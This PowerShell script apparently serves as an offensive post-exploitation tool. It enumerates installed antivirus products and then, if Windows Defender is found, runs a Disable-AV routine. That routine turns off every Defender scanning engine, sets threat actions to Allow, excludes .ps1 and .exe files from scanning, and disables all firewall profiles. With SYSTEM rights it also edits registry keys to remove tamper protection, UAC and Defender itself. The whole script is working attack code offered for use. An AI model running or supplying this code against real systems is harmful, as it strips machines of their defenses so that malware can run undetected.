
function Test-Administrator  
{  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

function Get-LHSAntiVirusProduct {
<#
.SYNOPSIS
    Get the status of Antivirus Product on local and Remote Computers.
 
.DESCRIPTION
    It works with MS Security Center and detects the status for most AV products.
 
    Note that this script will only work on Windows XP SP2, Vista, 7, 8.x, 10 
    operating systems as Windows Servers does not have 
    the required WMI SecurityCenter\SecurityCenter(2) name spaces.
 
.PARAMETER ComputerName
    The computer name(s) to retrieve the info from. 
 
.EXAMPLE
    Get-LHSAntiVirusProduct
 
    ComputerName             : Localhost
    Name                     : Kaspersky Endpoint Security 10 für Windows
    ProductExecutable        : C:\Program Files (x86)\Kaspersky Lab\Kaspersky Endpoint 
                               Security 10 for Windows SP1\wmiav.exe
    DefinitionStatus         : UP_TO_DATE
    RealTimeProtectionStatus : ON
    ProductState             : 266240
 
.EXAMPLE
    Get-LHSAntiVirusProduct –ComputerName PC1,PC2,PC3
 
    ComputerName             : PC1
    Name                     : Kaspersky Endpoint Security 10 für Windows
    ProductExecutable        : C:\Program Files (x86)\Kaspersky Lab\Kaspersky Endpoint 
                               Security 10 for Windows SP1\wmiav.exe
    DefinitionStatus         : UP_TO_DATE
    RealTimeProtectionStatus : ON
    ProductState             : 266240
    (..)
 
.EXAMPLE
    (get-content PClist.txt) | Get-LHSAntiVirusProduct
 
 .INPUTS
    System.String, you can pipe ComputerNames to this Function
 
.OUTPUTS
    Custom PSObjects 
 
.NOTE
    WMI query to get anti-virus infor­ma­tion has been changed.
    Pre-Vista clients used the root/SecurityCenter name­space, 
    while Post-Vista clients use the root/SecurityCenter2 name­space.
    But not only the name­space has been changed, The properties too. 
 
 
    More info at http://neophob.com/2010/03/wmi-query-windows-securitycenter2/
    and from this MSDN Blog 
    http://blogs.msdn.com/b/alejacma/archive/2008/05/12/how-to-get-antivirus-information-with-wmi-vbscript.aspx
 
 
    AUTHOR: Pasquale Lantella 
    LASTEDIT: 23.06.2016
    KEYWORDS: Antivirus
    Version :1.1
    History :1.1 support for Win 10, changed the use of WMI productState   
 
.LINK
    WSC_SECURITY_PRODUCT_STATE enumeration
    https://msdn.microsoft.com/en-us/library/jj155490%28v=vs.85%29
 
.LINK
    Windows Security Center
    https://msdn.microsoft.com/en-us/library/gg537273%28v=vs.85%29
 
.LINK
    http://neophob.com/2010/03/wmi-query-windows-securitycenter2/
 
#Requires -Version 2.0
#>
 
 
[CmdletBinding()]
param (
    [parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
    [Alias('CN')]
    [String[]]$ComputerName=$env:computername
)
 
BEGIN {
    Set-StrictMode -Version Latest
    ${CmdletName} = $Pscmdlet.MyInvocation.MyCommand.Name
    Write-Host "[+] Enumerating the current active PSP..."
 
} # end BEGIN
 
PROCESS {
 
    ForEach ($Computer in $computerName) 
    {
        IF (Test-Connection -ComputerName $Computer -count 2 -quiet) 
        { 
            Try
            {
                [system.Version]$OSVersion = (Get-WmiObject win32_operatingsystem -computername $Computer).version
 
                IF ($OSVersion -ge [system.version]'6.0.0.0') 
                {
                    Write-Verbose "OS Windows Vista/Server 2008 or newer detected."
                    $AntiVirusProduct = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct -ComputerName $Computer -ErrorAction Stop
                } 
                else 
                {
                    Write-Verbose "Windows 2000, 2003, XP detected" 
                    $AntiVirusProduct = Get-WmiObject -Namespace root\SecurityCenter -Class AntiVirusProduct  -ComputerName $Computer -ErrorAction Stop
                }
 
                <#
                it appears that if you convert the productstate to HEX then you can read the 1st 2nd or 3rd block 
                to get whether product is enabled/disabled and whether definitons are up-to-date or outdated
                #>
                Write-Verbose "[+] Enumerating the PSP State"
                $productState = $AntiVirusProduct.productState
 
                # convert to hex, add an additional '0' left if necesarry
                #$hex = [Convert]::ToString($productState, 16).PadLeft(6,'0')
    			$hex = [convert]::ToString($productState[0], 16).PadLeft(6,'0')
 
 
                # Substring(int startIndex, int length)  
                $WSC_SECURITY_PROVIDER = $hex.Substring(0,2)
                $WSC_SECURITY_PRODUCT_STATE = $hex.Substring(2,2)
                $WSC_SECURITY_SIGNATURE_STATUS = $hex.Substring(4,2)
 
                #n ot used yet
                $SECURITY_PROVIDER = switch ($WSC_SECURITY_PROVIDER)
                {
                    0  {"NONE"}
                    1  {"FIREWALL"}
                    2  {"AUTOUPDATE_SETTINGS"}
                    4  {"ANTIVIRUS"}
                    8  {"ANTISPYWARE"}
                    16 {"INTERNET_SETTINGS"}
                    32 {"USER_ACCOUNT_CONTROL"}
                    64 {"SERVICE"}
                    default {"UNKNOWN"}
                }
 
 
                $RealTimeProtectionStatus = switch ($WSC_SECURITY_PRODUCT_STATE)
                {
                    "00" {"OFF"} 
                    "01" {"EXPIRED"}
                    "10" {"ON"}
                    "11" {"SNOOZED"}
                    default {"UNKNOWN"}
                }
 
                $DefinitionStatus = switch ($WSC_SECURITY_SIGNATURE_STATUS)
                {
                    "00" {"UP_TO_DATE"}
                    "10" {"OUT_OF_DATE"}
                    default {"UNKNOWN"}
                }  

                # Output PSCustom Object
                $AV = $Null
                $AV = New-Object -TypeName PSObject -ErrorAction Stop -Property @{
                    ComputerName = $AntiVirusProduct.__Server;
                    Name = $AntiVirusProduct.displayName;
                    ProductExecutable = $AntiVirusProduct.pathToSignedProductExe;
                    ReportingExecutable = $AntiVirusProduct.pathToSignedReportingExe;
                    DefinitionStatus = $DefinitionStatus;
                    RealTimeProtectionStatus = $RealTimeProtectionStatus;
                    ProductState = $productState;
 
                } | Select-Object ComputerName,Name,ProductExecutable,ReportingExecutable,DefinitionStatus,RealTimeProtectionStatus,ProductState  
                return $AV
            }
            Catch 
            {
                Write-Error "\\$Computer : WMI Error"
                Write-Error $_
            }
        }
        else 
        {
            Write-Warning "\\$computer DO NOT reply to ping" 
        } 
 
    }
}
END {
    Write-Host "[+] Get-LHSAntiVirusProduct completed!" }  
}

function Disable-AV {
    param(
        $agressive=$true,
        $exclPath=$env:TEMP
    )
    
    if(!(Test-Administrator)){
        Write-Host "[-] Disable-AV needs to be ran from a High-Integrity Administrator process."
        return
    }
    $isSystem = $($(whoami) -eq "nt authority\system")

    Write-Host "[+] Attempting to Disable UAC, Firewalls, and Windows Defender with Path Exclusions and Defender Preferences."

    $defender=(Get-MpComputerStatus)
    if ($defender.IsTamperProtected){
        if ($isSystem){
            # Tamper protection
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4
        }
        else{
            Write-Host "[-] Tamper Protection Detected. Unable to automatically turn off Defender."
            Write-Host "[*] if you have GUI access, Turn off Tamper Protection in Windows Security > Virus & Threat Protection"
            Write-Host "[*] Otherwise, you must run this script with SYSTEM privileges"
            return
        }
    }
    
    Write-Host "[+] Disabling Scanning Engines (Set-MpPreference)"
    foreach ($cmd in $(Get-Command Set-MPPreference).Parameters.Values){
        $action = $cmd.Name
        if( $action -like "Disable*"){
            $errorChoice = 'ErrorAction'
            $params = @{ $action = $true; $errorChoice = 'SilentlyContinue' }
            Write-Host "    [*] Disabling $($action.Substring(7))"
            Set-MPPreference @params
        }
        elseif ($action -like "Enable*") {
            $errorChoice = 'ErrorAction'
            # These guys are special
            if($action -like "*NetworkProtection" -or $action -like "*ControlledFolderAccess"){
                $params = @{ $action = 'Disabled'; $errorChoice = 'SilentlyContinue' }
            }
            else{
                $params = @{ $action = $false; $errorChoice = 'SilentlyContinue' }
            }
            Write-Host "    [*] Disabling $($action.Substring(6))"
            Set-MPPreference @params
        }
    }

    Write-Host "[+] Setting default discovered threat actions to Allow (Set-MpPreference)"
    Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
    Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
    Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue


    Write-Host "[+] Adding Exclusion to '$($exclPath)', PS1s, EXEs, and disabling Firewalls"
    Set-MpPreference -ExclusionExtension "ps1" -ErrorAction SilentlyContinue
    Set-MpPreference -ExclusionExtension "exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $exclPath
    # disable firewalls (requires admin)
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

    if($isSystem) {
        Write-Host "[*] Attempting to disable UAC, RTP, Tamper Protection, and Defender through the Registry"

        Write-Host "[+] Disabling Realtime Protection (HKLM Hive)"
        # Cloud-delivered protection:
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0
        # Automatic Sample submission
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 0

        Write-Host "[+] Allowing admins to perform elevated actions without consent prompt popup"
        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0
        
        if($aggressive){
            Write-Host "[*] Agressive mode on. Modifying values that require a reboot to take effect"
            
            Write-Host "[+] Disabling UAC (HKLM Hive)"
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0

            # Determine if Defender vulnerable to complete disabling
            $curVersion=($defender.AMServiceVersion).Split('.')
            $safeVersion=("4.18.2108.4").Split('.')
            $safe = $true
            for( ($i=0); $i -lt $safeVersion.Count; $i++)
            {
                if ($curVersion[$i] -lt $safeVersion[$i]) {
                    $safe = $false
                    break
                }
            }
            # Defender
            if( $safe ){
                Write-Host "[-] Unable to Disable Microsoft Defender Antivirus on Windows Defender v$($defender.AMServiceVersion)."
                Write-Host "[-] Windows Defender versions after 4.18.2108.4 ignore the registry key."
            }
            else{
                Write-Host "[+] Windows Defender version " + $defender.AMServiceVersion + " vulnerable to disabling."
                Write-Host "[+] Disabling Defender (HKLM Hive)"
                Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
            }
        }
    }
    else{
        Write-Host "[-] Run with SYSTEM integrity to disable UAC, TP, Tamper Protection, and Defender through the Registry!"
    }
    Write-Host "[+] Disable-AV Completed!"
}

$AV = Get-LHSAntiVirusProduct
$AV

if ($AV.ProductExecutable -Like "*windowsdefender://*"){
    Disable-AV
}
elseif($AV.Count -eq 0){
    Write-Host "[-] No AV provided. Assumming Windows Defender."
    Disable-AV
} 
else{
    Write-Host "Unsupported PSP '$($AV.ProductExecutable)'. Disabling AV only supported with Windows Defender"
}
